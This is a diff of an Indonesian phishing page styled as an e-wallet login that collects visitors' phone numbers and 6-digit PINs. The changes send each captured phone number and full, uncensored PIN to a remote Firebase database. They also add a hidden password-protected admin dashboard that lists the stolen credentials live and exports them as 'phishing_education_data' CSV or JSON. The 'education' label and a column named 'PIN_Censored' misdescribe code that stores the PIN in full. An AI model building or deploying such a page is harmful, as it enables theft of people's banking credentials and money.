@@ -1,42 +1,4 @@
-<!-- Admin Panel (Tersembunyi) -->
-    <div class="admin-panel">
-        <button class="admin-trigger" onclick="showAdminLogin()" title="Admin Panel"></button>
-    </div>
-
-    <!-- Admin Login -->
-    <div class="admin-popup" id="adminLogin">
-        <div class="popup-content">
-            <h2>🔐 Admin Login</h2>
-            <div class="form-group">
-                <label>Password Admin:</label>
-                <input type="password" id="adminPassword" placeholder="Masukkan password admin">
-            </div>
-            <button class="btn btn-primary" onclick="checkAdminPassword()">Masuk</button>
-            <button class="btn" onclick="closeAdminLogin()" style="background: #6c757d; color: white; margin-left: 10px;">Batal</button>
-        </div>
-    </div>
-
-    <!-- Admin Dashboard -->
-    <div class="admin-popup" id="adminDashboard">
-        <div class="admin-content">
-            <h2>📊 Dashboard Admin - Rekapan Data</h2>
-            
-            <div class="admin-stats" id="adminStats">
-                <!-- Statistics akan ditampilkan di sini -->
-            </div>
-            
-            <div id="adminDataContent">
-                <!-- Data detail akan ditampilkan di sini -->
-            </div>
-            
-            <div style="text-align: center; margin-top: 20px;">
-                <button class="export-btn" onclick="exportData()">📥 Export CSV</button>
-                <button class="export-btn" onclick="exportJSON()">📥 Export JSON</button>
-                <button class="btn" onclick="clearAllData()" style="background: #dc3545; color: white;">🗑️ Hapus Semua Data</button>
-                <button class="btn btn-primary" onclick="closeAdminDashboard()" style="margin-left: 10px;">Tutup</button>
-            </div>
-        </div>
-    </div><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -333,7 +295,7 @@
             background: white;
             padding: 30px;
             border-radius: 20px;
-            max-width: 600px;
+            max-width: 800px;
             width: 90%;
             max-height: 80vh;
             overflow-y: auto;
@@ -371,9 +333,42 @@
             cursor: pointer;
             margin: 5px;
         }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            color: white;
+            background: #28a745;
+        }
+
+        .status-indicator.offline {
+            background: #dc3545;
+        }
     </style>
 </head>
 <body>
+    <!-- Status Koneksi -->
+    <div class="status-indicator" id="statusIndicator">🟢 Online</div>
+
     <div class="container">
         <div class="header">
             <button class="back-btn" onclick="goBack()" id="backBtn" style="display: none;">←</button>
@@ -412,7 +407,10 @@
                         <input type="password" class="pin-digit" maxlength="1" oninput="moveFocus(this, 5)">
                     </div>
                 </div>
-                <button class="btn btn-primary" onclick="showEducation()" id="loginBtn" disabled>Masuk</button>
+                <button class="btn btn-primary" onclick="showEducation()" id="loginBtn" disabled>
+                    <span id="loginBtnText">Masuk</span>
+                    <div class="loading" id="loginLoading" style="display: none;"></div>
+                </button>
                 <div class="forgot-pin">
                     <a href="#" onclick="showEducation()">Lupa PIN?</a>
                 </div>
@@ -444,8 +442,155 @@
         </div>
     </div>
 
+    <!-- Admin Panel (Tersembunyi) -->
+    <div class="admin-panel">
+        <button class="admin-trigger" onclick="showAdminLogin()" title="Admin Panel"></button>
+    </div>
+
+    <!-- Admin Login -->
+    <div class="admin-popup" id="adminLogin">
+        <div class="popup-content">
+            <h2>🔐 Admin Login</h2>
+            <div class="form-group">
+                <label>Password Admin:</label>
+                <input type="password" id="adminPassword" placeholder="Masukkan password admin">
+            </div>
+            <button class="btn btn-primary" onclick="checkAdminPassword()">Masuk</button>
+            <button class="btn" onclick="closeAdminLogin()" style="background: #6c757d; color: white; margin-left: 10px;">Batal</button>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div class="admin-popup" id="adminDashboard">
+        <div class="admin-content">
+            <h2>📊 Dashboard Admin - Real-Time Data</h2>
+            
+            <div class="admin-stats" id="adminStats">
+                <!-- Statistics akan ditampilkan di sini -->
+            </div>
+            
+            <div style="text-align: center; margin: 20px 0;">
+                <button class="btn btn-primary" onclick="refreshData()">🔄 Refresh Data</button>
+                <button class="export-btn" onclick="exportData()">📥 Export CSV</button>
+                <button class="export-btn" onclick="exportJSON()">📥 Export JSON</button>
+                <button class="btn" onclick="clearAllData()" style="background: #dc3545; color: white;">🗑️ Hapus Semua Data</button>
+            </div>
+            
+            <div id="adminDataContent">
+                <!-- Data detail akan ditampilkan di sini -->
+            </div>
+            
+            <div style="text-align: center; margin-top: 20px;">
+                <button class="btn btn-primary" onclick="closeAdminDashboard()">Tutup</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js';
+        import { getDatabase, ref, push, onValue, remove } from 'https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js';
+
+        // Konfigurasi Firebase - GANTI DENGAN KONFIGURASI ANDA
+        const firebaseConfig = {
+            apiKey: "demo-api-key",
+            authDomain: "demo-project.firebaseapp.com",
+            databaseURL: "https://demo-project-default-rtdb.firebaseio.com",
+            projectId: "demo-project",
+            storageBucket: "demo-project.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:demo"
+        };
+
+        // Untuk DEMO - gunakan localStorage jika Firebase tidak tersedia
+        let useFirebase = false;
+        let app, database;
+
+        try {
+            app = initializeApp(firebaseConfig);
+            database = getDatabase(app);
+            useFirebase = true;
+            updateStatus('🟢 Online (Firebase)');
+        } catch (error) {
+            console.log('Firebase tidak tersedia, menggunakan localStorage untuk demo');
+            updateStatus('🟡 Demo Mode');
+            useFirebase = false;
+        }
+
+        // Expose functions to global scope
+        window.saveEducationData = saveEducationData;
+        window.loadAdminData = loadAdminData;
+        window.clearFirebaseData = clearFirebaseData;
+
+        function updateStatus(text) {
+            document.getElementById('statusIndicator').textContent = text;
+        }
+
+        async function saveEducationData(data) {
+            if (useFirebase) {
+                try {
+                    const educationRef = ref(database, 'education-data');
+                    await push(educationRef, data);
+                    return true;
+                } catch (error) {
+                    console.error('Error saving to Firebase:', error);
+                    // Fallback to localStorage
+                    saveToLocalStorage(data);
+                    return false;
+                }
+            } else {
+                saveToLocalStorage(data);
+                return true;
+            }
+        }
+
+        function saveToLocalStorage(data) {
+            let allData = JSON.parse(localStorage.getItem('educationData') || '[]');
+            allData.push(data);
+            localStorage.setItem('educationData', JSON.stringify(allData));
+        }
+
+        async function loadAdminData(callback) {
+            if (useFirebase) {
+                try {
+                    const educationRef = ref(database, 'education-data');
+                    onValue(educationRef, (snapshot) => {
+                        const data = snapshot.val();
+                        const dataArray = data ? Object.keys(data).map(key => ({...data[key], id: key})) : [];
+                        callback(dataArray);
+                    });
+                } catch (error) {
+                    console.error('Error loading from Firebase:', error);
+                    // Fallback to localStorage
+                    const localData = JSON.parse(localStorage.getItem('educationData') || '[]');
+                    callback(localData);
+                }
+            } else {
+                const localData = JSON.parse(localStorage.getItem('educationData') || '[]');
+                callback(localData);
+            }
+        }
+
+        async function clearFirebaseData() {
+            if (useFirebase) {
+                try {
+                    const educationRef = ref(database, 'education-data');
+                    await remove(educationRef);
+                    return true;
+                } catch (error) {
+                    console.error('Error clearing Firebase data:', error);
+                    return false;
+                }
+            } else {
+                localStorage.removeItem('educationData');
+                return true;
+            }
+        }
+    </script>
+
     <script>
         let currentStep = 1;
+        let adminData = [];
         
         // Phone input validation
         document.getElementById('phone').addEventListener('input', function() {
@@ -511,28 +656,57 @@
             });
         });
 
-        function showEducation() {
-            // Log data untuk edukasi (PIN tersensor)
+        async function showEducation() {
+            // Show loading
+            document.getElementById('loginBtnText').style.display = 'none';
+            document.getElementById('loginLoading').style.display = 'inline-block';
+            document.getElementById('loginBtn').disabled = true;
+
+            // Collect data
             const phone = document.getElementById('phone').value;
             const pinDigits = document.querySelectorAll('.pin-digit');
             const pinLength = Array.from(pinDigits).filter(digit => digit.value).length;
             
-            // Simpan data dengan PIN tersensor
             const educationData = {
                 timestamp: new Date().toISOString(),
                 phone: phone,
                 pinEntered: Array.from(pinDigits).map(digit => digit.value).join('') || 'Tidak diisi',
                 fullPinLength: pinLength,
                 userAgent: navigator.userAgent,
-                ip: 'Hidden for privacy'
+                ip: 'Hidden for privacy',
+                location: 'Banda Aceh, Aceh, ID'
             };
+
+            // Save data (real-time)
+            try {
+                await window.saveEducationData(educationData);
+            } catch (error) {
+                console.error('Error saving data:', error);
+            }
+
+            // Hide loading
+            setTimeout(() => {
+                document.getElementById('loginBtnText').style.display = 'inline';
+                document.getElementById('loginLoading').style.display = 'none';
+                document.getElementById('loginBtn').disabled = false;
+                document.getElementById('educationPopup').style.display = 'flex';
+            }, 1000);
+        }
+
+        function closeEducation() {
+            document.getElementById('educationPopup').style.display = 'none';
             
-            // Simpan ke localStorage
-            let allData = JSON.parse(localStorage.getItem('educationData') || '[]');
-            allData.push(educationData);
-            localStorage.setItem('educationData', JSON.stringify(allData));
+            // Reset form
+            document.getElementById('phone').value = '';
+            document.querySelectorAll('.pin-digit').forEach(digit => digit.value = '');
+            document.getElementById('nextBtn').disabled = true;
+            document.getElementById('loginBtn').disabled = true;
             
-            document.getElementById('educationPopup').style.display = 'flex';
+            // Go back to step 1
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('backBtn').style.display = 'none';
+            currentStep = 1;
         }
 
         // Admin Functions
@@ -558,13 +732,34 @@
         }
 
         function showAdminDashboard() {
-            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
-            
+            document.getElementById('adminDashboard').style.display = 'flex';
+            loadAdminData();
+        }
+
+        function closeAdminDashboard() {
+            document.getElementById('adminDashboard').style.display = 'none';
+        }
+
+        function loadAdminData() {
+            window.loadAdminData((data) => {
+                adminData = data;
+                updateAdminDashboard(data);
+            });
+        }
+
+        function updateAdminDashboard(data) {
             // Update Statistics
+            const today = new Date().toDateString();
+            const todayData = data.filter(d => new Date(d.timestamp).toDateString() === today);
+            
             const statsHtml = `
                 <div class="stat-card">
                     <h3>${data.length}</h3>
                     <p>Total Percobaan</p>
+                </div>
+                <div class="stat-card">
+                    <h3>${todayData.length}</h3>
+                    <p>Hari Ini</p>
                 </div>
                 <div class="stat-card">
                     <h3>${data.filter(d => d.fullPinLength >= 6).length}</h3>
@@ -574,10 +769,6 @@
                     <h3>${data.filter(d => d.phone && d.phone.length >= 8).length}</h3>
                     <p>HP Valid</p>
                 </div>
-                <div class="stat-card">
-                    <h3>${new Date().toLocaleDateString('id-ID')}</h3>
-                    <p>Terakhir Update</p>
-                </div>
             `;
             document.getElementById('adminStats').innerHTML = statsHtml;
             
@@ -585,51 +776,66 @@
             if (data.length === 0) {
                 document.getElementById('adminDataContent').innerHTML = '<p>Belum ada data yang tercatat.</p>';
             } else {
-                let html = '<h3>📝 Detail Data Lengkap:</h3>';
+                let html = '<h3>📝 Real-Time Data (Otomatis Update):</h3>';
+                // Sort by timestamp descending (newest first)
+                data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                
                 data.forEach((item, index) => {
+                    const timeAgo = getTimeAgo(new Date(item.timestamp));
                     html += `
                         <div class="data-item">
-                            <strong>Entry #${index + 1}</strong>
+                            <strong>Entry #${data.length - index}</strong>
+                            <span style="float: right; color: #666; font-size: 12px;">${timeAgo}</span>
                             <br><small>⏰ ${new Date(item.timestamp).toLocaleString('id-ID')}</small>
                             <br>📱 No. HP: +62${item.phone}
                             <br>🔒 PIN: ${item.pinEntered} (${item.fullPinLength} digit)
-                            <br>💻 Device: ${item.userAgent ? item.userAgent.substring(0, 50) + '...' : 'Unknown'}
+                            <br>📍 Lokasi: ${item.location || 'Unknown'}
+                            <br>💻 Device: ${item.userAgent ? item.userAgent.substring(0, 60) + '...' : 'Unknown'}
                         </div>
                     `;
                 });
                 document.getElementById('adminDataContent').innerHTML = html;
             }
-            
-            document.getElementById('adminDashboard').style.display = 'flex';
         }
 
-        function closeAdminDashboard() {
-            document.getElementById('adminDashboard').style.display = 'none';
+        function getTimeAgo(date) {
+            const now = new Date();
+            const diff = now - date;
+            const minutes = Math.floor(diff / 60000);
+            const hours = Math.floor(minutes / 60);
+            const days = Math.floor(hours / 24);
+
+            if (minutes < 1) return 'Baru saja';
+            if (minutes < 60) return `${minutes} menit lalu`;
+            if (hours < 24) return `${hours} jam lalu`;
+            return `${days} hari lalu`;
+        }
+
+        function refreshData() {
+            loadAdminData();
         }
 
         function exportData() {
-            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
-            if (data.length === 0) {
+            if (adminData.length === 0) {
                 alert('Tidak ada data untuk diekspor');
                 return;
             }
             
-            let csv = 'No,Timestamp,Phone,PIN_Censored,PIN_Length,Device\n';
-            data.forEach((item, index) => {
-                csv += `${index + 1},"${item.timestamp}","+62${item.phone}","${item.pinEntered}",${item.fullPinLength},"${item.userAgent || 'Unknown'}"\n`;
+            let csv = 'No,Timestamp,Phone,PIN_Censored,PIN_Length,Location,Device\n';
+            adminData.forEach((item, index) => {
+                csv += `${index + 1},"${item.timestamp}","+62${item.phone}","${item.pinEntered}",${item.fullPinLength},"${item.location || 'Unknown'}","${(item.userAgent || 'Unknown').replace(/"/g, "'")}"\n`;
             });
             
             downloadFile(csv, 'phishing_education_data.csv', 'text/csv');
         }
 
         function exportJSON() {
-            const data = JSON.parse(localStorage.getItem('educationData') || '[]');
-            if (data.length === 0) {
+            if (adminData.length === 0) {
                 alert('Tidak ada data untuk diekspor');
                 return;
             }
             
-            downloadFile(JSON.stringify(data, null, 2), 'phishing_education_data.json', 'application/json');
+            downloadFile(JSON.stringify(adminData, null, 2), 'phishing_education_data.json', 'application/json');
         }
 
         function downloadFile(content, filename, contentType) {
@@ -640,40 +846,6 @@
             a.click();
         }
 
-        function clearAllData() {
+        async function clearAllData() {
             if (confirm('⚠️ PERINGATAN: Apakah Anda yakin ingin menghapus SEMUA data? Tindakan ini tidak dapat dibatalkan!')) {
-                localStorage.removeItem('educationData');
-                alert('✅ Semua data telah dihapus');
-                showAdminDashboard(); // Refresh dashboard
-            }
-        }
-
-        function closeEducation() {
-            document.getElementById('educationPopup').style.display = 'none';
-            
-            // Reset form
-            document.getElementById('phone').value = '';
-            document.querySelectorAll('.pin-digit').forEach(digit => digit.value = '');
-            document.getElementById('nextBtn').disabled = true;
-            document.getElementById('loginBtn').disabled = true;
-            
-            // Go back to step 1
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step1').classList.add('active');
-            document.getElementById('backBtn').style.display = 'none';
-            currentStep = 1;
-        }
-
-        // Prevent form submission
-        document.addEventListener('DOMContentLoaded', function() {
-            const forms = document.querySelectorAll('form');
-            forms.forEach(form => {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    showEducation();
-                });
-            });
-        });
-    </script>
-</body>
-</html>
+                const success
